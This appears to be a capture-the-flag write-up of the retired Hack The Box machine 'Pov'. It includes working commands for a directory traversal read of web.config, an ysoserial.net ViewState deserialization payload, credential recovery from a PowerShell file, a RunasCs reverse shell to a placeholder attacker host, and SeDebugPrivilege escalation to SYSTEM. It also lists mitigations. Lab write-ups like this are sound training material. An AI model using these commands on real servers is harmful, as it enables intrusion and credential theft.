---
machine: Pov
os: Windows
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [windows, iis, aspnet, viewstate, ysoserial, credential, sedebugprivilege, privesc]
---

# Pov — Hack The Box (Windows)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

The ASP.NET site allows file read and directory traversal; `web.config` leaks the `machineKey`. `ysoserial.net` signs a malicious ViewState and runs code as `sfitz`. A PowerShell `connection.xml` holds `alaading`'s credential, and `SeDebugPrivilege` allows injection into a SYSTEM process and Administrator.

## Recon

```bash
nmap -Pn -sCV -p80 <IP>
```

- Only `80` with IIS and an ASP.NET portfolio.
- `ffuf` finds `pov.htb` and the email `sfitz@pov.htb`.
- The app uses `__VIEWSTATE` and returns detailed errors.

## Enumeration

- A download parameter allows file read and directory traversal.
- Read `web.config` one level above the portfolio directory.
- It contains a `machineKey` with `decryptionKey` and `validationKey`.

```text
?file=..%2fweb.config
```

## Foothold

`ysoserial.net` builds a ViewState with the `WindowsIdentity` gadget, the keys and the `/portfolio` path. Send it in `__VIEWSTATE` and run a reverse shell as `pov\sfitz`.

```powershell
ysoserial.exe -p ViewState -g WindowsIdentity --decryptionalg=AES \
  --decryptionkey=<KEY> --validationalg=SHA1 --validationkey=<KEY> \
  --path=/portfolio -c "powershell -e <BASE64>"
```

## Lateral movement

`C:\Users\sfitz\Documents\connection.xml` holds a `PSCredential` for `alaading`. Import it with `Import-Clixml` and use `RunasCs` for a shell.

```powershell
$cred = Import-Clixml .\connection.xml
$cred.GetNetworkCredential().Password
.\RunasCs.exe alaading <PASS> cmd.exe -r <ATTACKER>:444
```

## Privilege escalation

`alaading` has `SeDebugPrivilege`. Migrate to a SYSTEM process with Meterpreter or use `psgetsys.ps1` to duplicate the `winlogon` token and get SYSTEM; then reach Administrator's desktop.

```powershell
.\psgetsys.ps1
```

## Evidence

- File read and traversal.
- `web.config` with `machineKey`.
- Malicious ViewState and `sfitz`.
- `connection.xml` and `alaading`.
- `SeDebugPrivilege` and Administrator.

## Lessons learned

- File read in ASP.NET can expose `machineKey`.
- ViewState with unrotated keys is exploitable deserialization.
- PowerShell credential files are secrets.
- `SeDebugPrivilege` equals SYSTEM.

## Mitigation and detection

- Validate paths and block traversal.
- Rotate `machineKey` and enable `ViewStateMac`.
- Never store `PSCredential` in user folders.
- Restrict `SeDebugPrivilege` and audit its use.

## References

- [0xdf — Pov](https://0xdf.gitlab.io/2024/06/08/htb-pov.html)
- [IppSec — Pov](https://www.youtube.com/watch?v=84xCsHvkxYE)
- [Hack The Box — Pov](https://app.hackthebox.com/machines/pov)
